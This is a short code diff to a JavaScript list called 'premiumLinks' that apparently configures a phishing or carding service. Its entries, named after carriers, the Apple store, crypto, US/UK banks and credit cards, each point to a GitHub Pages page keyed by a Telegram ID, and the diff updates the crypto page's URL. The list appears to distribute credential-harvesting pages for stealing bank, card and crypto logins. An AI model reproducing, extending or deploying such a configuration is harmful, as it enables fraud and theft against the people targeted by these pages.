@@ -17,7 +17,7 @@ const premiumLinks = [
           { name: "Verizon carting", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRyVhEfLAUC8Nd7bQfXbAW5XCOHJdnoXKNDQQ&s", urlTemplate: "https://mlomiao.github.io/m/x/t2.html?id={telegram-id}" },
         { name: "Lyca mobile", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRUp7KlMZp8Ku7g8SKFuiMSPIG68Hk-gZKttH0JweQENQ&s", urlTemplate: "https://mlomiao.github.io/m/x/t3.html?id={telegram-id}" },
         { name: "Apple store carting", image: "https://i.ibb.co/5hBt5hMv/Background-Eraser-20251204-212533709.png", urlTemplate: "https://mlomiao.github.io/m/x/t4.html?id={telegram-id}" },
-      { name: "Crypto link", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS19-daOGUYgkbwY70z-O4j6sk8XlLEs9od1Q&s", urlTemplate: "https://moulinmuila.github.io/cw/C2/c.html?id={telegram-id}" },
+      { name: "Crypto link", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS19-daOGUYgkbwY70z-O4j6sk8XlLEs9od1Q&s", urlTemplate: "https://moulinmuila.github.io/cw/C2?id={telegram-id}" },
       { name: "USA/UK Bank", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQOjthucJtza9EiaLXSAeTgImnMpc9uni2U3MlfY0-oRA&s=10", urlTemplate: "https://fliacrypnloi.github.io/pm/nb/nbb/usb.html?id={telegram-id}" },
       { name: "USA/UK Bank and CC", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSaN8BT_E1jZNWT1lkaTg-dBXrd7Igy2dHg5qndshrdEw&s", urlTemplate: "https://fliacrypnloi.github.io/pm/Mobixhub?id={telegram-id}" },
       { name: "All country CC", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRPZxcXqQQTeN_9JxbVY769xJlxrSH6pgxVRTVTYu45OEnWc78OPuWqwvXv&s=10", urlTemplate: "https://fliacrypnloi.github.io/pm/Mobixhub/m?id={telegram-id}" },
